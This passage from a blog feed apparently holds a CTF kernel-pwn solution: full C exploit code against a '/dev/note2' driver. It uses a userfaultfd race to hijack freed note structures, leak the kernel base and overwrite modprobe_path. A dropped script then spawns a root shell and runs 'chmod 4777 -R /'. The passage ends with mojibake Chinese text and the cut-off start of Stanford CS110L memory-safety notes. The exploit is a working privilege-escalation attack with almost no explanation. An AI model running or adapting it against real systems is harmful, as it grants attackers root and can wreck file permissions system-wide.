class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/ldt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> uLL;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><br><span class="hljs-type">size_t</span> koffset = <span class="hljs-number">0</span>, kleak = <span class="hljs-number">0</span>, kbase = <span class="hljs-number">0xffffffff81000000</span>, kheap = <span class="hljs-number">0xffff888000000000</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>, pop_rdi_ret = <span class="hljs-literal">NULL</span>, init_cred = <span class="hljs-literal">NULL</span>, swapgs_restore_regs_and_return_to_usermode = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> kfd = <span class="hljs-number">-1</span>, fault_cnt = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i += <span class="hljs-number">8</span>)<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016llx\e[0m\n&quot;</span>, i, *(uLL *)(buf + i));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">fatal</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1m[x] Error at: %s\e[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> idx;<br>    <span class="hljs-type">uint64_t</span> size;<br>    <span class="hljs-type">uint64_t</span> buf;<br>&#125; Note;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .size = size,<br>            .buf = buf,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF00</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .idx = idx,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF03</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .idx = idx,<br>            .buf = buf,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF01</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteShow</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .idx = idx,<br>            .buf = buf,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF02</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *buf;<br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span> *))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); <span class="hljs-comment">// Create UserFaultFd</span><br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        fatal(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        fatal(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>) <span class="hljs-comment">// Register UserFaultFd</span><br>        fatal(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *)uffd); <span class="hljs-comment">// Run Handler</span><br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        fatal(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br>fault_handler_thread(<span class="hljs-type">void</span> *arg)<br>&#123;<br>    page_size = sysconf(_SC_PAGESIZE);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">long</span> uffd;<br>    uffd = (<span class="hljs-type">long</span>)arg;<br><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br><br><span class="hljs-keyword">while</span> (poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg)) &lt;= <span class="hljs-number">0</span>) fatal(<span class="hljs-string">&quot;read(uffd)&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd %02llx Start!\e[0m\n&quot;</span>, fault_cnt);<br>        <br>        <span class="hljs-keyword">switch</span> (fault_cnt)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * @brief kfree(0x18) (node-&gt;data)  !!Affected by UserFaultfd Now!!</span><br><span class="hljs-comment">             *        kfree(0x18) (struct node)</span><br><span class="hljs-comment">             */</span><br>            noteDel(<span class="hljs-number">0</span>);<br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 0 [*] Consume the 0x18 chunk (struct node)</span><br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 1 [*] Get the 0x18 chunk (node-&gt;data) as our new node struct so we can overwrite it</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * @brief kfree(0x18) (node-&gt;data)  !!Affected by UserFaultfd Now!!</span><br><span class="hljs-comment">             *        kfree(0x18) (struct node)</span><br><span class="hljs-comment">             */</span><br>            noteDel(<span class="hljs-number">2</span>);<br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 2 [*] Consume the 0x18 chunk (struct node)</span><br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 3 [*] Get the 0x18 chunk (node-&gt;data) as our new node struct so we can overwrite it</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            fatal(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)page; <span class="hljs-comment">// Addr to copy from</span><br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)msg.arg.pagefault.address &amp;<br>                          ~(page_size - <span class="hljs-number">1</span>); <span class="hljs-comment">// Addr to copy to</span><br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] uffdio_copy.src = 0x%016lx\e[0m\n&quot;</span>, uffdio_copy.src);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] uffdio_copy.dst = 0x%016lx\e[0m\n&quot;</span>, uffdio_copy.dst);<br><br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>) <span class="hljs-comment">// Back to copy_from_user</span><br>            fatal(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd %02llx Done!\e[0m\n&quot;</span>, fault_cnt);<br>        fault_cnt++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[*] Status saved.\e[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evilEdit</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[+] fault_page = 0x%016lx\e[0m\n&quot;</span>,buf + <span class="hljs-number">0x1000</span>*fault_cnt);<br>    noteEdit((<span class="hljs-type">int</span>)args, buf + <span class="hljs-number">0x1000</span>*fault_cnt);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1m[x] What happened? \e[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] Enjoy your shell...\e[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hijack_modprobe</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">// 0x752f706d742f</span><br>system(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\nsetsid cttyhack setuidgid 0 /bin/sh\nchmod 4777 -R /\n&#x27; &gt; /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/nightu&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/nightu&quot;</span>);<br>system(<span class="hljs-string">&quot;/tmp/nightu&quot;</span>);<br>system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> pwn_cpu;<br>    <span class="hljs-type">pthread_t</span> <span class="hljs-type">edit_t</span>, <span class="hljs-type">hijack_t</span>;<br>    <span class="hljs-type">size_t</span> rand_key, leak_addr;<br>    CPU_ZERO(&amp;pwn_cpu);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;pwn_cpu);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">cpu_set_t</span>), &amp;pwn_cpu))<br>        fatal(<span class="hljs-string">&quot;sched_setaffinity&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[*] Wish you every shell...\e[0m\n&quot;</span>);<br>    saveStatus();<br><br>    kfd = open(<span class="hljs-string">&quot;/dev/note2&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (kfd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        fatal(<span class="hljs-string">&quot;\e[31m\e[1m[x] Fuck DEV \e[0m\n&quot;</span>);<br>    &#125;<br><br>    buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(buf, <span class="hljs-number">0x4000</span>, fault_handler_thread);<br><br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-type">size_t</span> *fake_node = (<span class="hljs-type">size_t</span> *)page;<br>    <span class="hljs-comment">// [*] Though we set key = 0, the addr&#x27;s data was encrypted before we change the key</span><br>    fake_node[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    fake_node[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>;<br>    fake_node[<span class="hljs-number">2</span>] = <span class="hljs-number">0xfffffe0000000000</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief The first time, we try to hijack a node struct to AAR.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     */</span><br><br>    noteAdd(<span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 0</span><br>    pthread_create(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-type">void</span> *)<span class="hljs-number">0</span>);<br>    usleep(<span class="hljs-number">300000</span>);<br><br>    noteShow(<span class="hljs-number">1</span>, page);<br>    Hexdump(page, <span class="hljs-number">0x100</span>);<br>    rand_key = (*(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">0x8</span>)) ^ (<span class="hljs-number">0x00000000ffffffff</span>);<br>    *(<span class="hljs-type">size_t</span> *)(page) ^= rand_key;<br>    *(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">8</span>) ^= rand_key;<br>    *(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">0x10</span>) ^= rand_key;<br>    leak_addr = *(<span class="hljs-type">size_t</span> *)(page);<br>    kbase = (*(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">0x4</span>)) - <span class="hljs-number">0xa08e00</span>;<br>    <span class="hljs-type">size_t</span> modprobe_path = kbase + <span class="hljs-number">0x1654b20</span>;<br>    Hexdump(page, <span class="hljs-number">0x30</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] rand_key = 0x%016lx\e[0m\n&quot;</span>, rand_key);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] leak_addr = 0x%016lx\e[0m\n&quot;</span>, leak_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] kbase = 0x%016lx\e[0m\n&quot;</span>, kbase);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] modprobe_path = 0x%016lx\e[0m\n&quot;</span>, modprobe_path);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief The second time, we try to hijack a node struct to AAW.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     */</span><br>    fake_node[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    fake_node[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>;<br>    fake_node[<span class="hljs-number">2</span>] = modprobe_path;<br>    noteAdd(<span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 2</span><br>    pthread_create(&amp;<span class="hljs-type">hijack_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-type">void</span> *)<span class="hljs-number">2</span>);<br>    usleep(<span class="hljs-number">300000</span>);<br><br>    noteShow(<span class="hljs-number">3</span>, page);<br>    Hexdump(page, <span class="hljs-number">0x100</span>);<br>    rand_key = (*(<span class="hljs-type">size_t</span> *)(page)) ^ (<span class="hljs-number">0x6f6d2f6e6962732f</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] rand_key = 0x%016lx\e[0m\n&quot;</span>, rand_key);<br>    <span class="hljs-built_in">strcpy</span>(page,<span class="hljs-string">&quot;/tmp/u&quot;</span>);<br>    *(<span class="hljs-type">size_t</span> *)(page) ^= rand_key;<br>    *(<span class="hljs-type">size_t</span> *)(page+<span class="hljs-number">8</span>) ^= rand_key;<br>    noteEdit(<span class="hljs-number">3</span>, page);<br><br>    hijack_modprobe();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202211301714001.png" alt="image-20221130171423180"></p><p>åé¢å†è¡¥.jpg</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Stanford CS 110L (Safety in Systems Programming)</title>
    <link href="/posts/397be8a1.html"/>
    <url>/posts/397be8a1.html</url>
    
    <content type="html"><![CDATA[<p>Stanford çš„å…¬å¼€è¯¾ï¼Œå¯ä»¥åœ¨<a href="https://reberhardt.com/cs110l/spring-2020/">è¿™é‡Œ</a>æ‰¾åˆ°ï¼Œè¿™é‡Œå•çº¯å­˜ç‚¹ç¬”è®°ã€‚</p><p>ç¬”è€…èƒ½åŠ›éå¸¸æœ‰é™ğŸ‘¦ğŸ»ï¼Œæ‰€ä»¥å‘ç°é—®é¢˜è¿˜è¯·å¤šå¤šæŒ‡æ•™ ovo</p><h1>Lecture 2: Memory Safety</h1><h2 id="Pre-class-exercise"><a class="header-anchor" href="#Pre-class-exercise">Â¶</a>Pre-class exercise</h2><p>ä»¥ä¸‹ç¨‹åºè‡³å°‘æœ‰ä¸ƒå¤„ bugï¼Œå°½å¯èƒ½çš„æ‰¾åˆ°å®ƒä»¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-comment">// There are at least 7 bugs relating to memory on this snippet.</span><br><span class="hljs-comment">// Find them all!</span><br><br><span 